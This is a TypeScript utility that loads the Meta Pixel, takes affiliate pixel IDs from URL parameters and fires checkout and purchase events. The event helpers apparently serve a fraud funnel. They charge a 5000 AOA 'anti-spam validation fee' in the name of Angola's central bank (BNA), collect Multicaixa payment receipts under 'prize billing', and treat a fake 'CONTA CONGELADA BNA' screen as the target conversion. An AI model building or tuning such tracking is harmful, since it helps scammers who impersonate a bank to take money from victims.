/**
 * Meta (Facebook) Pixel Integration Utility
 * Handles dynamic script loading, URL parameters extraction for affiliate marketing,
 * and cautious event coordination to prevent duplicate or unwanted sales/conversion fires.
 */

// Global window interface extension for TypeScript
declare global {
  interface Window {
    fbq?: any;
    _fbq?: any;
  }
}

// Keep track of fired events in this session to prevent duplicate/uncoordinated triggers
const firedEvents = new Set<string>();

/**
 * Extracts and retrieves the active Meta Pixel ID.
 * Priority order:
 * 1. URL search parameters: `?pixel=...` or `?fbpix=...` or `?fb_pixel=...`
 * 2. Cached value in localStorage
 * 3. Environment Variable `import.meta.env.VITE_PIXEL_ID`
 */
export function getPixelId(): string {
  try {
    const searchParams = new URLSearchParams(window.location.search);
    const urlPixel = searchParams.get('pixel') || searchParams.get('fbpix') || searchParams.get('fb_pixel');
    
    if (urlPixel && urlPixel.trim()) {
      const cleaned = urlPixel.trim();
      localStorage.setItem('meta_pixel_id', cleaned);
      return cleaned;
    }
    
    const cachedPixel = localStorage.getItem('meta_pixel_id');
    if (cachedPixel && cachedPixel.trim()) {
      return cachedPixel.trim();
    }
    
    const envPixel = (import.meta.env as any).VITE_PIXEL_ID;
    if (envPixel && envPixel.trim()) {
      return envPixel.trim();
    }
  } catch (e) {
    console.error('[Meta Pixel] Error reading Pixel ID sources:', e);
  }
  return '';
}

/**
 * Dynamically loads and initializes the Meta Pixel script.
 * Only initializes if a valid Pixel ID is detected.
 */
export function initMetaPixel(): void {
  const pixelId = getPixelId();
  if (!pixelId) {
    console.log('[Meta Pixel] No Pixel ID found in URL, localStorage, or environment variables. Tracking is disabled until configured.');
    return;
  }

  try {
    // Standard Facebook Pixel snippet
    if (!window.fbq) {
      window.fbq = function() {
        window.fbq.callMethod ? window.fbq.callMethod.apply(window.fbq, arguments) : window.fbq.queue.push(arguments);
      };
      if (!window._fbq) window._fbq = window.fbq;
      window.fbq.push = window.fbq;
      window.fbq.loaded = true;
      window.fbq.version = '2.0';
      window.fbq.queue = [];

      const scriptElement = document.createElement('script');
      scriptElement.async = true;
      scriptElement.src = 'https://connect.facebook.net/en_US/fbevents.js';
      
      const firstScript = document.getElementsByTagName('script')[0];
      if (firstScript && firstScript.parentNode) {
        firstScript.parentNode.insertBefore(scriptElement, firstScript);
      } else {
        document.head.appendChild(scriptElement);
      }
    }

    // Initialize the pixel
    window.fbq('init', pixelId);
    console.log(`[Meta Pixel] Initialized successfully with ID: ${pixelId}`);
    
    // PageView
    trackPixelEvent('PageView');
  } catch (error) {
    console.error('[Meta Pixel] Error initializing script:', error);
  }
}

/**
 * Tracks custom or standard events with optional parameter payloads.
 * Protects against uncoordinated duplicates using the `firedEvents` registry where applicable.
 * 
 * @param eventName Name of standard or custom event (e.g. PageView, InitiateCheckout, AddPaymentInfo, Purchase)
 * @param params Optional arguments (e.g., value, currency, etc.)
 * @param once If true, ensures this event type is only fired ONCE in this browser tab lifecycle
 */
export function trackPixelEvent(eventName: string, params?: Record<string, any>, once: boolean = false): void {
  const pixelId = getPixelId();
  if (!pixelId) {
    // In development or simulation mode without a pixel, log to console so the user sees exactly what is happening
    console.log(`[Meta Pixel Debug] (No Pixel Configured) Would track: "${eventName}"`, params || '');
    return;
  }

  // Prevent duplicate firing if required
  if (once) {
    const eventKey = `${eventName}_${JSON.stringify(params || {})}`;
    if (firedEvents.has(eventKey)) {
      console.log(`[Meta Pixel] Blocked duplicate event tracking for: "${eventName}" to ensure cautious/coordinated metrics.`);
      return;
    }
    firedEvents.add(eventKey);
  }

  try {
    if (window.fbq) {
      if (params) {
        window.fbq('track', eventName, params);
      } else {
        window.fbq('track', eventName);
      }
      console.log(`[Meta Pixel] Tracked Event: "${eventName}"`, params || '');
    } else {
      console.warn(`[Meta Pixel] fbq function not found on window while trying to track: "${eventName}"`);
    }
  } catch (error) {
    console.error(`[Meta Pixel] Failed to track event "${eventName}":`, error);
  }
}

/**
 * Highly coordinated event helpers
 */

// Triggered when user enters Checkout page with payment instructions
export function trackInitiateCheckout(amount: number = 5000): void {
  trackPixelEvent('InitiateCheckout', {
    value: amount,
    currency: 'AOA',
    content_name: 'Taxa Antispam de Validacao BNA',
    content_category: 'Tarifas Bancarias'
  }, true); // once: true is crucial here to prevent chaotic multi-triggers
}

// Triggered when user selects/uploads a payment receipt file (but before validation starts)
export function trackAddPaymentInfo(): void {
  trackPixelEvent('AddPaymentInfo', {
    content_category: 'Faturamento de Premios',
    content_name: 'Submissao do Comprovativo Multicaixa'
  }, true); // once: true to keep events tidy
}

// Triggered when the transaction validation is successfully concluded and the system shows "CONTA CONGELADA BNA" (the ultimate target screen)
export function trackPurchase(amount: number = 5000): void {
  trackPixelEvent('Purchase', {
    value: amount,
    currency: 'AOA',
    content_name: 'Validacao Anti-Spam Protocolo BNA',
    content_type: 'product'
  }, true); // once: true is strictly required here to prevent uncoordinated sales reporting
}
